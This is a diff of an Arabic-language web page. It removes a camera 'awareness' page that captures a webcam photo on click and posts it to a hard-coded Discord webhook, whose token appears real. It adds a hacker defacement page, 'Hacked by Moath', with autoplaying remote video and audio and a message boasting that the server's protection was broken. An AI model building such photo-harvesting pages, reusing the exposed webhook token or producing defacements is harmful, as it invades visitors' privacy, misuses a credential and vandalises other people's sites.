@@ -1,101 +1,106 @@
 <!DOCTYPE html>
 <html lang="ar">
 <head>
-  <meta charset="UTF-8">
-  <title>تجربة الكاميرا - توعية</title>
-  <style>
-    body {
-      text-align: center;
-      font-family: Arial;
-      margin-top: 40px;
-      background-color: #f0f0f0;
-    }
-    video, canvas {
-      width: 300px;
-      height: 225px;
-      border: 2px solid #444;
-      margin: 10px;
-    }
-    button {
-      margin: 10px;
-      padding: 10px 20px;
-      font-size: 18px;
-      cursor: pointer;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hacked by Moath</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #000;
+            font-family: 'Courier New', Courier, monospace;
+            color: #0f0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            height: 100vh;
+            text-align: left;
+        }
+        .image-container video {
+            width: 750px;
+            height: auto;
+            border: 2px solid #0f0;
+            border-radius: 15px;
+            box-shadow: 0 0 15px rgba(0, 255, 0, 0.7);
+            margin-bottom: 20px;
+        }
+        .terminal {
+            width: 80%;
+            max-width: 800px;
+            padding: 20px;
+            border: 2px solid #0f0;
+            box-shadow: 0 0 20px #0f0;
+            background: rgba(0, 0, 0, 0.8);
+        }
+        .title {
+            font-size: 2em;
+            color: #fff;
+            margin-bottom: 20px;
+        }
+        .command {
+            color: #fff;
+        }
+        .message {
+            margin-top: 10px;
+            line-height: 1.5em;
+            white-space: pre-wrap;
+        }
+        .footer {
+            margin-top: 30px;
+            font-size: 0.8em;
+            color: #555;
+        }
+        .typewriter {
+            overflow: hidden;
+            border-right: .15em solid #0f0;
+            white-space: nowrap;
+            animation: typing 6s steps(60, end), blink-caret .75s step-end infinite;
+        }
+        @keyframes typing {
+            from { width: 0 }
+            to { width: 100% }
+        }
+        @keyframes blink-caret {
+            from, to { border-color: transparent }
+            50% { border-color: #0f0; }
+        }
+    </style>
 </head>
 <body>
+    <!-- الفيديو autoplay -->
+    <div class="image-container">
+        <video id="hackvid" autoplay muted playsinline loop>
+            <source src="https://h.top4top.io/m_3409a280l1.mov" type="video/mp4">
+            متصفحك لا يدعم الفيديو
+        </video>
+    </div>
 
-  <h2>📷 هذا الموقع يطلب إذن الكاميرا</h2>
-  <p>إذا ضغطت "سماح"، الكاميرا راح تشتغل الآن</p>
+    <!-- الصوت -->
+    <audio autoplay loop>
+        <source src="https://k.top4top.io/m_3409qjpk41.mp3" type="audio/mpeg">
+        متصفحك لا يدعم الصوت
+    </audio>
 
-  <video id="video" autoplay></video><br>
+    <!-- التيرمنال -->
+    <div class="terminal">
+        <div class="title">HACKED BY MOATH</div>
+        <div class="command">mystery@system:~$ why?</div>
+        <div class="message typewriter">
+server Hackd By Moath … The protection has been broken. No one can do it.
+        </div>
+        <div class="footer">OFFICALY BLACKSHAMMER - MOATHNETWORK</div>
+    </div>
 
-  <button id="captureBtn">📸 التقط صورة</button><br>
-
-  <canvas id="canvas" width="300" height="225" style="display:none;"></canvas><br>
-
-  <button id="sendBtn" style="display:none;">🚀 أرسل الصورة</button>
-
-  <p id="status"></p>
-
-  <script>
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
-    const ctx = canvas.getContext('2d');
-    const captureBtn = document.getElementById('captureBtn');
-    const sendBtn = document.getElementById('sendBtn');
-    const statusText = document.getElementById('status');
-
-    // اطلب إذن الكاميرا
-    navigator.mediaDevices.getUserMedia({ video: true })
-      .then(stream => {
-        video.srcObject = stream;
-      })
-      .catch(err => {
-        alert("⚠️ تم رفض إذن الكاميرا");
-      });
-
-    // عند الضغط على التقط صورة
-    captureBtn.addEventListener('click', () => {
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-      canvas.style.display = 'block';
-      sendBtn.style.display = 'inline-block';
-      statusText.innerText = '';
-    });
-
-    // عند الضغط على إرسال
-    sendBtn.addEventListener('click', () => {
-      const imageData = canvas.toDataURL('image/png');
-
-      // ضع هنا رابط Webhook الخاص بك من Discord
-      const webhookURL = "https://discord.com/api/webhooks/1402734488383127572/NH5TH4Q9l5C2ecpvnlrgv6lQ08ebL_A4hyTvtYyDRmgFxqf_qz9hQ9_499ktRWgZAugw"; // ← بدله بالويب هوك الحقيقي
-
-      fetch(webhookURL, {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-          username: "📸 صورة من تجربة الكاميرا",
-          embeds: [{
-            title: "صورة التقطت من المستخدم",
-            image: {
-              url: imageData
-            }
-          }]
-        })
-      })
-      .then(res => {
-        statusText.innerText = "✅ تم إرسال الصورة بنجاح.";
-        sendBtn.disabled = true;
-      })
-      .catch(err => {
-        statusText.innerText = "❌ حدث خطأ أثناء الإرسال.";
-        console.error(err);
-      });
-    });
-  </script>
-
+    <script>
+        // نخلي الفيديو يتشغل وبعدها نشيل الـ mute
+        const vid = document.getElementById("hackvid");
+        vid.play().then(() => {
+            vid.muted = false;
+        }).catch(err => {
+            console.log("المتصفح منع التشغيل التلقائي:", err);
+        });
+    </script>
 </body>
 </html>
